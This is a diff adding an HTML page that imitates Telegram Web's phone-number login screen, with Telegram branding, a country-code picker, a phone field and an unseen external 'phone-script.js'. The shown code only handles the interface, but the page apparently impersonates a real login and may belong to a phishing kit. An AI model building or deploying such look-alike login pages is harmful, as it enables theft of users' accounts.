@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web - Phone Login</title>
+    <link rel="stylesheet" href="styles2.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="Telegram_2019_Logo.svg.webp" alt="Telegram Logo">
+        </div>
+        
+        <h1>Telegram</h1>
+        <p class="subtitle">Please confirm your country code and enter your<br>phone number.</p>
+        
+        <div class="form">
+            <div class="input-group">
+                <div class="input-label">Country</div>
+                <div class="select-wrapper">
+                    <div class="country-display">
+                        <span>United States</span>
+                        <svg viewBox="0 0 24 24" class="arrow-icon">
+                            <path d="M7 10l5 5 5-5z"></path>
+                        </svg>
+                    </div>
+                    <div class="countries-dropdown">
+                        <input type="text" id="country-search" placeholder="Search">
+                        <div class="countries-list">
+                            <div class="country-option selected" data-code="+1">
+                                <img src="https://flagcdn.com/us.svg" alt="United States"> United States <span>+1</span>
+                            </div>
+                            <div class="country-option" data-code="+93">
+                                <img src="https://flagcdn.com/af.svg" alt="Afghanistan"> Afghanistan <span>+93</span>
+                            </div>
+                            <div class="country-option" data-code="+355">
+                                <img src="https://flagcdn.com/al.svg" alt="Albania"> Albania <span>+355</span>
+                            </div>
+                            <div class="country-option" data-code="+213">
+                                <img src="https://flagcdn.com/dz.svg" alt="Algeria"> Algeria <span>+213</span>
+                            </div>
+                            <div class="country-option" data-code="+54">
+                                <img src="https://flagcdn.com/ar.svg" alt="Argentina"> Argentina <span>+54</span>
+                            </div>
+                            <div class="country-option" data-code="+61">
+                                <img src="https://flagcdn.com/au.svg" alt="Australia"> Australia <span>+61</span>
+                            </div>
+                            <div class="country-option" data-code="+43">
+                                <img src="https://flagcdn.com/at.svg" alt="Austria"> Austria <span>+43</span>
+                            </div>
+                            <div class="country-option" data-code="+32">
+                                <img src="https://flagcdn.com/be.svg" alt="Belgium"> Belgium <span>+32</span>
+                            </div>
+                            <div class="country-option" data-code="+55">
+                                <img src="https://flagcdn.com/br.svg" alt="Brazil"> Brazil <span>+55</span>
+                            </div>
+                            <div class="country-option" data-code="+1">
+                                <img src="https://flagcdn.com/ca.svg" alt="Canada"> Canada <span>+1</span>
+                            </div>
+                            <div class="country-option" data-code="+86">
+                                <img src="https://flagcdn.com/cn.svg" alt="China"> China <span>+86</span>
+                            </div>
+                            <div class="country-option" data-code="+45">
+                                <img src="https://flagcdn.com/dk.svg" alt="Denmark"> Denmark <span>+45</span>
+                            </div>
+                            <div class="country-option" data-code="+20">
+                                <img src="https://flagcdn.com/eg.svg" alt="Egypt"> Egypt <span>+20</span>
+                            </div>
+                            <div class="country-option" data-code="+358">
+                                <img src="https://flagcdn.com/fi.svg" alt="Finland"> Finland <span>+358</span>
+                            </div>
+                            <div class="country-option" data-code="+33">
+                                <img src="https://flagcdn.com/fr.svg" alt="France"> France <span>+33</span>
+                            </div>
+                            <div class="country-option" data-code="+49">
+                                <img src="https://flagcdn.com/de.svg" alt="Germany"> Germany <span>+49</span>
+                            </div>
+                            <div class="country-option" data-code="+30">
+                                <img src="https://flagcdn.com/gr.svg" alt="Greece"> Greece <span>+30</span>
+                            </div>
+                            <div class="country-option" data-code="+36">
+                                <img src="https://flagcdn.com/hu.svg" alt="Hungary"> Hungary <span>+36</span>
+                            </div>
+                            <div class="country-option" data-code="+354">
+                                <img src="https://flagcdn.com/is.svg" alt="Iceland"> Iceland <span>+354</span>
+                            </div>
+                            <div class="country-option" data-code="+91">
+                                <img src="https://flagcdn.com/in.svg" alt="India"> India <span>+91</span>
+                            </div>
+                            <div class="country-option" data-code="+62">
+                                <img src="https://flagcdn.com/id.svg" alt="Indonesia"> Indonesia <span>+62</span>
+                            </div>
+                            <div class="country-option" data-code="+39">
+                                <img src="https://flagcdn.com/it.svg" alt="Italy"> Italy <span>+39</span>
+                            </div>
+                            <div class="country-option" data-code="+81">
+                                <img src="https://flagcdn.com/jp.svg" alt="Japan"> Japan <span>+81</span>
+                            </div>
+                            <div class="country-option" data-code="+352">
+                                <img src="https://flagcdn.com/lu.svg" alt="Luxembourg"> Luxembourg <span>+352</span>
+                            </div>
+                            <div class="country-option" data-code="+52">
+                                <img src="https://flagcdn.com/mx.svg" alt="Mexico"> Mexico <span>+52</span>
+                            </div>
+                            <div class="country-option" data-code="+31">
+                                <img src="https://flagcdn.com/nl.svg" alt="Netherlands"> Netherlands <span>+31</span>
+                            </div>
+                            <div class="country-option" data-code="+64">
+                                <img src="https://flagcdn.com/nz.svg" alt="New Zealand"> New Zealand <span>+64</span>
+                            </div>
+                            <div class="country-option" data-code="+47">
+                                <img src="https://flagcdn.com/no.svg" alt="Norway"> Norway <span>+47</span>
+                            </div>
+                            <div class="country-option" data-code="+351">
+                                <img src="https://flagcdn.com/pt.svg" alt="Portugal"> Portugal <span>+351</span>
+                            </div>
+                            <div class="country-option" data-code="+7">
+                                <img src="https://flagcdn.com/ru.svg" alt="Russia"> Russia <span>+7</span>
+                            </div>
+                            <div class="country-option" data-code="+34">
+                                <img src="https://flagcdn.com/es.svg" alt="Spain"> Spain <span>+34</span>
+                            </div>
+                            <div class="country-option" data-code="+46">
+                                <img src="https://flagcdn.com/se.svg" alt="Sweden"> Sweden <span>+46</span>
+                            </div>
+                            <div class="country-option" data-code="+41">
+                                <img src="https://flagcdn.com/ch.svg" alt="Switzerland"> Switzerland <span>+41</span>
+                            </div>
+                            <div class="country-option" data-code="+44">
+                                <img src="https://flagcdn.com/gb.svg" alt="United Kingdom"> United Kingdom <span>+44</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <div class="input-label">Your phone number</div>
+                <div class="phone-input">
+                    <span class="prefix">+1</span>
+                    <input type="tel" placeholder="Phone number" id="phone-input">
+                </div>
+            </div>
+
+            <button class="next-button" id="next-button" style="display: none;">
+                NEXT
+            </button>
+        </div>
+
+        <div class="buttons">
+            <a href="index.html" class="qr-login">LOG IN BY QR CODE</a>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const countryDisplay = document.querySelector('.country-display');
+            const countrySearch = document.getElementById('country-search');
+            const countryOptions = document.querySelectorAll('.country-option');
+            const dropdown = document.querySelector('.countries-dropdown');
+            const prefix = document.querySelector('.prefix');
+            const phoneInput = document.getElementById('phone-input');
+            const nextButton = document.getElementById('next-button');
+
+            // Phone input handler
+            phoneInput.addEventListener('input', function() {
+                // Remove any non-digit characters
+                this.value = this.value.replace(/\D/g, '');
+                
+                // Show/hide next button based on input length
+                if (this.value.length >= 5) {
+                    nextButton.style.display = 'block';
+                } else {
+                    nextButton.style.display = 'none';
+                }
+            });
+
+            countryDisplay.addEventListener('click', function() {
+                dropdown.classList.toggle('show');
+            });
+
+            countryOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const code = this.dataset.code;
+                    const countryName = this.textContent.trim().split(' ')[0];
+                    prefix.textContent = code;
+                    countryDisplay.querySelector('span').textContent = countryName;
+                    countryOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    dropdown.classList.remove('show');
+                });
+            });
+
+            countrySearch.addEventListener('input', function() {
+                const searchText = this.value.toLowerCase();
+                countryOptions.forEach(option => {
+                    const text = option.textContent.toLowerCase();
+                    option.style.display = text.includes(searchText) ? 'flex' : 'none';
+                });
+            });
+
+            document.addEventListener('click', function(e) {
+                if (!e.target.closest('.select-wrapper')) {
+                    dropdown.classList.remove('show');
+                }
+            });
+        });
+    </script>
+    <script src="phone-script.js"></script>
+</body>
+</html> 
